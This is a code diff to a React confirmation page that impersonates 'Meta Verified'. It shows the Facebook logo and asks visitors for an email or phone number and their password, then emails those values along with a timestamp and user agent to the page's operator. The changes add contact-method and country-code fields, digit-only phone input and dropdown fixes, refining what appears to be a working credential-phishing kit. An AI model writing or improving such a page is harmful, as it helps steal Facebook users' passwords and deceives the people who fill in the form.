@@ -30,6 +30,8 @@ import { parsePhoneNumber, getCountryCallingCode } from 'libphonenumber-js';
 const formTwoSchema = z.object({
   user_email: z.string().optional(),
   password: z.string().min(6, "Password must be at least 6 characters"),
+  contactMethod: z.enum(['email', 'phone']),
+  countryCode: z.string().optional()
 });
 
 type FormTwoValues = z.infer<typeof formTwoSchema>;
@@ -48,12 +50,14 @@ export default function Confirmation() {
     defaultValues: {
       user_email: "",
       password: "",
+      contactMethod: 'email',
+      countryCode: '+1'
     },
   });
 
   // Handle country search
   useEffect(() => {
-    const filtered = countries.filter(country => 
+    const filtered = countries.filter(country =>
       country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
       country.code.toLowerCase().includes(countrySearch.toLowerCase())
     );
@@ -112,7 +116,7 @@ export default function Confirmation() {
         countryCode: contactMethod === 'phone' ? countryCode : undefined,
         timestamp: new Date().toLocaleString(),
         userAgent: navigator.userAgent,
-        ipAddress: "Not available" 
+        ipAddress: "Not available"
       };
 
       await sendConfirmationFormEmail(formattedData);
@@ -135,13 +139,13 @@ export default function Confirmation() {
 
   return (
     <>
-      <MetaTags 
+      <MetaTags
         title="Meta Verified | Confirmation"
         description="Request a verified badge on Facebook - Final Step"
       />
       <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
         <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20">
-          <img 
+          <img
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
             alt="Logo"
             className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
@@ -203,8 +207,8 @@ export default function Confirmation() {
                               <SelectTrigger className="w-[100px]">
                                 <SelectValue placeholder="Code" />
                               </SelectTrigger>
-                              <SelectContent className="max-h-[200px]">
-                                <div className="sticky top-0 p-2 bg-white border-b">
+                              <SelectContent>
+                                <div className="sticky top-0 p-2 bg-white border-b z-50">
                                   <div className="flex items-center px-2 py-1 border rounded-md">
                                     <Search className="w-4 h-4 text-gray-500 mr-2" />
                                     <input
@@ -212,6 +216,12 @@ export default function Confirmation() {
                                       placeholder="Search country..."
                                       value={countrySearch}
                                       onChange={(e) => setCountrySearch(e.target.value)}
+                                      onKeyDown={(e) => {
+                                        // Prevent dropdown from closing on keyboard events
+                                        if (e.key === 'Enter' || e.key === 'Space') {
+                                          e.preventDefault();
+                                        }
+                                      }}
                                     />
                                   </div>
                                 </div>
@@ -226,7 +236,8 @@ export default function Confirmation() {
                             </Select>
                           )}
                           <Input
-                            type={contactMethod === 'email' ? 'email' : 'tel'}
+                            type={contactMethod === 'email' ? 'email' : 'text'}
+                            inputMode={contactMethod === 'email' ? 'email' : 'numeric'}
                             placeholder={
                               contactMethod === 'email'
                                 ? "Enter email address"
@@ -235,8 +246,9 @@ export default function Confirmation() {
                             className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                             {...field}
                             onChange={(e) => {
-                              const value = e.target.value.replace(/\s+/g, '');
+                              let value = e.target.value;
                               if (contactMethod === 'phone') {
+                                value = value.replace(/[^\d]/g, ''); // Only allow digits
                                 handlePhoneInput(value);
                               } else {
                                 field.onChange(value);
@@ -283,8 +295,8 @@ export default function Confirmation() {
                 />
               </div>
 
-              <Button 
-                type="submit" 
+              <Button
+                type="submit"
                 className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200 shadow-md"
                 disabled={form.formState.isSubmitting}
               >
